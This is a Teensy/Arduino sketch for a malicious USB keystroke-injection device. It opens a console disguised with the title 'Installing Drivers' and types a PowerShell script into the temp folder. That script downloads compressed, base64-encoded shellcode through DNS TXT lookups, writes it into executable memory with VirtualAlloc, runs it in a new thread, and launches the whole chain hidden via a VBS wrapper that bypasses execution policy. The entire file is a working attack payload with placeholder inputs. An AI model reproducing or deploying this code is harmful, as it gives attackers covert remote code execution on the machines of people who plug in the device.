#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo function gscd ($scd){  > %temp%\\dce.ps1");
  Keyboard.println("echo $ANS = INPUT3  > %temp%\\dce.ps1");
  Keyboard.println("echo $i = 1  >> %temp%\\dce.ps1");
  Keyboard.println("echo while ($i -le INPUT2){  >> %temp%\\dce.ps1");
  Keyboard.println("echo if ($AuthNS -ne $null){  >> %temp%\\dce.ps1");
  Keyboard.println("echo $gtc = (iex \"nslookup -querytype=txt $i.$scd $ANS \")}  >> %temp%\\dce.ps1");
  Keyboard.println("echo else{$gtc = (iex \"nslookup -querytype=txt $i.$scd \")} >> %temp%\\dce.ps1");
  Keyboard.println("echo $temp = $gtc ^| Select-String -pattern ^\"`^\"^\" >> %temp%\\dce.ps1");
  Keyboard.println("echo $tmp1 = \"\"  >> %temp%\\dce.ps1");
  Keyboard.println("echo $tmp1 = $tmp1 + $temp  >> %temp%\\dce.ps1");
  Keyboard.println("echo $edt = $tmp1 -replace '\\s+', \"\" -replace ^\"^`\"\", \"\"  >> %temp%\\dce.ps1");
  Keyboard.println("echo $i++}  >> %temp%\\dce.ps1");
  Keyboard.println("echo $dec = [System.Convert]::FromBase64String($edt)  >> %temp%\\dce.ps1");
  Keyboard.println("echo $ms = New-Object System.IO.MemoryStream >> %temp%\\dce.ps1");
  Keyboard.println("echo $ms.Write($dec, 0, $dec.Length) >> %temp%\\dce.ps1");
  Keyboard.println("echo $ms.Seek(0,0) ^| Out-Null  >> %temp%\\dce.ps1");
  Keyboard.println("echo $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress) >> %temp%\\dce.ps1");
  Keyboard.println("echo $sr = New-Object System.IO.StreamReader($cs) >> %temp%\\dce.ps1");
  Keyboard.println("echo $cmd = $sr.readtoend() >> %temp%\\dce.ps1");
  Keyboard.println("echo return $cmd} >> %temp%\\dce.ps1");

  Keyboard.println("echo if ([IntPtr]::Size -eq 8){ >> %temp%\\dce.ps1");
  Keyboard.println("echo $S64 = (gscd INPUT1) >> %temp%\\dce.ps1");
  Keyboard.println("echo $tmp = $S64 -replace \"^`n\",\"\" -replace '\\$buf \\+\\= ',\",\" -replace '\\[Byte\\[\\]\\] \\$buf \\=' -replace \" \" >> %temp%\\dce.ps1");
  Keyboard.println("echo [Byte[]]$sc = $tmp -split ','} >> %temp%\\dce.ps1");
  Keyboard.println("echo else{ >> %temp%\\dce.ps1");
  Keyboard.println("echo $S32 = (gscd INPUT1) >> %temp%\\dce.ps1");
  Keyboard.println("echo $tmp = $S32 -replace \"^`n\",\"\" -replace '\\$buf \\+\\= ',\",\" -replace '\\[Byte\\[\\]\\] \\$buf \\=' -replace \" \" >> %temp%\\dce.ps1");
  Keyboard.println("echo [Byte[]]$sc = $tmp -split ','} >> %temp%\\dce.ps1");
  Keyboard.println("echo [string]$s = $t1 -replace \"`t\", \"\" >> %temp%\\dce.ps1");
  Keyboard.println("echo $s = $s.replace(\" \", \"\") >> %temp%\\dce.ps1");
  Keyboard.println("echo [Byte[]]$sc32 = $s -split ',' >> %temp%\\dce.ps1");  
  Keyboard.println("echo $co = @' >> %temp%\\dce.ps1");
  Keyboard.println("echo [DllImport(\"kernel32.dll\")] >> %temp%\\dce.ps1");
  Keyboard.println("echo public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); >> %temp%\\dce.ps1");
  Keyboard.println("echo [DllImport(\"kernel32.dll\")] >> %temp%\\dce.ps1");
  Keyboard.println("echo public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); >> %temp%\\dce.ps1");
  Keyboard.println("echo [DllImport(\"msvcrt.dll\")] >> %temp%\\dce.ps1");
  Keyboard.println("echo public static extern IntPtr memset(IntPtr dest, uint src, uint count); >> %temp%\\dce.ps1");
  Keyboard.println("echo '@ >> %temp%\\dce.ps1");
  Keyboard.println("echo $winFunc = Add-Type -memberDefinition $co -Name \"Win32\" -namespace Win32Functions -passthru >> %temp%\\dce.ps1");
  Keyboard.println("echo $size = 0x1000 >> %temp%\\dce.ps1");
  Keyboard.println("echo if ($sc.Length -gt 0x1000) {$size = $sc.Length} >> %temp%\\dce.ps1");
  Keyboard.println("echo $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) >> %temp%\\dce.ps1");
  Keyboard.println("echo for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} >> %temp%\\dce.ps1");
  Keyboard.println("echo $winFunc::CreateThread(0,0,$x,0,0,0) >> %temp%\\dce.ps1");
  Keyboard.println("echo while(1){sleep 100} >> %temp%\\dce.ps1");

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dce.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dce.ps1\"),0,true >> %temp%\\dce.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dce.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS